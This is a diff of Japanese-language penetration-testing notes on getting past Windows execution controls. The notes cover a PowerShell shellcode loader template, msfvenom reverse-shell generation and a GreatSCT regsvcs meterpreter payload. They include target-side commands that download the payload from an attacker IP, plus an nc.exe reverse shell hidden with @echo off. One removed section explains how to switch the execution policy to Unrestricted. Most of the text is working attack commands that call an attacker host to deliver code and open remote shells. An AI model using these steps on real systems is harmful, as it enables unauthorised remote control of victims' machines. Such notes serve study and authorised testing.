@@ -407,8 +407,9 @@ public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStack
 [DllImport("msvcrt.dll")]
 public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
-<place shellcode here>
+<shellcode>
 ```
+- 後続で生成したシェルコードを`<shellcode>`に挿入
 
 |API名|説明|
 |---|---|
@@ -421,33 +422,21 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 ```zsh
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f psh-reflection
 ```
-
 - `-f psh-reflection`：PowerShellリフレクション形式で出力（関数名・変数名は毎回ランダム生成）
 
 ## 3. 最終スクリプトの構成と実行
 
 1. テンプレートの `<place shellcode here>` に生成したシェルコードを挿入
 2. `bypass.ps1` として保存
-3. 攻撃者のLinux環境でリスナーを立てる
-
+3. リスナーを立てる
 ```zsh
 sudo rlwrap nc -lvnp <port>
 ```
 
 4. ターゲットのx86版PowerShellで実行
-
 ```powershell
 .\bypass.ps1
 ```
-
-**実行ポリシーエラーが出た場合：**
-
-```powershell
-Get-ExecutionPolicy -Scope CurrentUser   # 現状確認
-Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
-```
-
-> [!WARNING] GPOで実行ポリシーが制御されている場合は変更できないため、別のバイパスベクターを探す。
 
 > [!NOTE] ps1ファイルの欠点
 > ダブルクリックしてもメモ帳で開かれるだけで実行されない。
@@ -464,7 +453,6 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ## 攻撃者のマシン（Kali）
 
 1. インストール
-
 ```zsh
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup
@@ -473,26 +461,23 @@ cd ../
 ```
 
 2. ペイロードの作成
-
 ```zsh
 sudo ./GreatSCT.py --ip <attacker_IP> --port <port> -t bypass -p regsvcs/meterpreter/rev_tcp.py -o <output_filename>
 ```
 
-> [!TIP] 出力に以下の情報が含まれるのでよく確認すること：
-> 
+> [!NOTE]
+> 出力に以下の情報が含まれるのでよく確認すること：
 > - `DLL written to:` → 生成されたDLLの格納パス
 > - `Metasploit RC file written to:` → msfconsoleで使うRCファイルのパス
 > - `Execute with:` → ターゲット上での実行コマンド
 
 3. 転送用サーバを起動
-
 ```zsh
 cd <path_to_dll_dir>
 sudo python3 -m http.server 80
 ```
 
 4. meterpreterリスナーを起動
-
 ```zsh
 msfconsole -r <path_to_rc_file>
 ```
@@ -500,19 +485,16 @@ msfconsole -r <path_to_rc_file>
 ## ターゲットマシン（Windows）
 
 5. ペイロードのダウンロード
-
 ```powershell
 powershell -command Invoke-WebRequest -Uri 'http://<attacker_IP>:<port>/<payload_filename>' -OutFile 'C:\Temp\<payload_filename>'
 ```
 
 6. バッチファイル化
-
 ```cmd
 cmd /c "echo <execute_with_value> > C:\Temp\<filename>.bat"
 ```
 
 7. バッチファイルの実行
-
 ```cmd
 C:\Temp\<filename>.bat
 ```
@@ -523,17 +505,16 @@ C:\Temp\<filename>.bat
 
 シンプルなncを使ったリバースシェル手法。
 
-リバースシェル用バッチファイルの作成：
-
+リバースシェル用バッチファイルの作成
 ```cmd
 echo <path_to_nc.exe> -e cmd <attacker_IP> <port> > shell.bat
 ```
 
 `@echo off`でコマンド内容を非表示にして実行：
-
 ```cmd
 @echo off
 c:\temp\nc.exe <attacker_IP> <port> -e cmd.exe
 ```
 
-> [!NOTE] `@echo off` を先頭に付けることで、実行時にコマンド内容がコンソールに表示されなくなる。
+> [!NOTE]
+>  `@echo off` を先頭に付けることで、実行時にコマンド内容がコンソールに表示されなくなる。
